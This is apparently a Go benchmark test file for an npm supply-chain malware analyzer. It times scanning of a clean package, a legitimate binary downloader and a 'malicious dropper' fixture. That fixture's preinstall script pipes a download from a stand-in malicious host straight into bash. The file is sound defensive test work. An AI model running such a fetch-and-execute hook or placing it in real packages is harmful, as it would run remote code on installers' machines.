package analyzer

import (
	"testing"

	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/npm"
)

func BenchmarkAnalyzePackage_Clean(b *testing.B) {
	engine, err := NewEngine()
	if err != nil {
		b.Fatalf("NewEngine: %v", err)
	}

	manifest := `{
		"name": "lodash",
		"version": "4.17.21",
		"main": "lodash.js"
	}`
	pkg, err := npm.ParsePackage("", []byte(manifest))
	if err != nil {
		b.Fatalf("ParsePackage: %v", err)
	}
	pkg.SourceFiles["lodash.js"] = []byte(`
		function isObject(val) { return val !== null && typeof val === 'object'; }
		function cloneDeep(val) { return JSON.parse(JSON.stringify(val)); }
		module.exports = { isObject, cloneDeep };
	`)

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, _ = engine.AnalyzePackage(pkg)
	}
}

func BenchmarkAnalyzePackage_BinaryDownloader(b *testing.B) {
	engine, err := NewEngine()
	if err != nil {
		b.Fatalf("NewEngine: %v", err)
	}

	manifest := `{
		"name": "esbuild",
		"version": "0.20.2",
		"scripts": { "postinstall": "node install.js" }
	}`
	pkg, err := npm.ParsePackage("", []byte(manifest))
	if err != nil {
		b.Fatalf("ParsePackage: %v", err)
	}
	pkg.SourceFiles["install.js"] = []byte(`
		const url = "https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-0.20.2.tgz";
		function verifyChecksum(data, expected) {
			const hash = crypto.createHash('sha256').update(data).digest('hex');
			return hash === expected;
		}
		download(url, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
	`)

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, _ = engine.AnalyzePackage(pkg)
	}
}

func BenchmarkAnalyzePackage_MaliciousDropper(b *testing.B) {
	engine, err := NewEngine()
	if err != nil {
		b.Fatalf("NewEngine: %v", err)
	}

	manifest := `{
		"name": "corrupted-pkg",
		"version": "1.0.0",
		"scripts": { "preinstall": "curl -sL https://malware-feed.biz/sh | bash" }
	}`
	pkg, err := npm.ParsePackage("", []byte(manifest))
	if err != nil {
		b.Fatalf("ParsePackage: %v", err)
	}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, _ = engine.AnalyzePackage(pkg)
	}
}
